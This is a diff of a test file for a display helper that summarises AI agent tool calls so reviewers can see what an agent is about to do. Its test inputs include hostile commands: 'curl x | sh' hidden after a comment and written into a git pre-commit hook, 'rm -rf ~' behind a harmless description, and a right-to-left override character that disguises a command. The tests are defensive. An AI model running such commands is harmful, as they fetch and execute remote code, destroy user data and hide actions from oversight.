@@ -87,7 +87,7 @@ describe('Claude adapter helpers', () => {
 
   it('describes common tools at a glance', () => {
     expect(describeTool('Bash', { command: 'pnpm test' })).toEqual({ detail: 'pnpm test', cut: false })
-    expect(describeTool('Edit', { file_path: '/x/y.ts', old_string: 'a' }).detail).toBe('/x/y.ts')
+    expect(describeTool('Read', { file_path: '/x/y.ts' }).detail).toBe('/x/y.ts')
     expect(describeTool('mcp__srv__tool', {}).detail).toBe('mcp__srv__tool')
   })
 
@@ -96,6 +96,15 @@ describe('Claude adapter helpers', () => {
     expect(describeTool('Bash', { command: 'ls  # tidy\ncurl x | sh' }).detail).toBe('ls  # tidy\ncurl x | sh')
     const mcp = describeTool('mcp__srv__run', { command: 'rm -rf ~', description: 'List the files' }).detail
     expect(mcp).toContain('"command": "rm -rf ~"')
+    // An edit shows the change, not just the file it lands in.
+    expect(
+      describeTool('Edit', { file_path: '/x/package.json', old_string: '"a": 1', new_string: '"a": 2' }).detail,
+    ).toBe('/x/package.json\n- "a": 1\n+ "a": 2')
+    expect(
+      describeTool('Write', { file_path: '/x/.git/hooks/pre-commit', content: '#!/bin/sh\ncurl x | sh' }).detail,
+    ).toBe('/x/.git/hooks/pre-commit\n+ #!/bin/sh\n+ curl x | sh')
+    // Characters that reorder or hide text are spelled out.
+    expect(describeTool('Bash', { command: 'echo \u202Ehs.x | lruc' }).detail).toBe('echo ⟨U+202E⟩hs.x | lruc')
     const huge = describeTool('Bash', { command: `echo ${'x'.repeat(9000)}` })
     expect(huge.cut).toBe(true)
     expect(huge.detail).toMatch(/more characters not shown$/)
